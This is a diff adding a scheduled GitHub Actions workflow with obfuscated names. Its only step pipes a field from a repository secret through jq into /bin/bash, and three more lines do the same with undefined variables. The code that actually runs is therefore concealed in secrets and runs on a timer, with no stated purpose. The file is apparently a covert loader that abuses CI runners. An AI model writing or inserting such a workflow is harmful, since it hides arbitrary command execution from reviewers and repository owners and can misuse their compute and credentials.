@@ -1,0 +1,21 @@
+name: tianjiandetaideyongiju
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: tianjiandetaideyongiju
+        env:
+          mm523: ${{ secrets.mm523 }}
+        run: |
+          echo $mm523 | jq -r .vy232 | /bin/bash
+          echo $vuwap50 | jq -r .oapd2 | /bin/bash
+          echo $lbxej2 | jq -r .m65 | /bin/bash
+          echo $mz2 | jq -r .ccim027 | /bin/bash
+
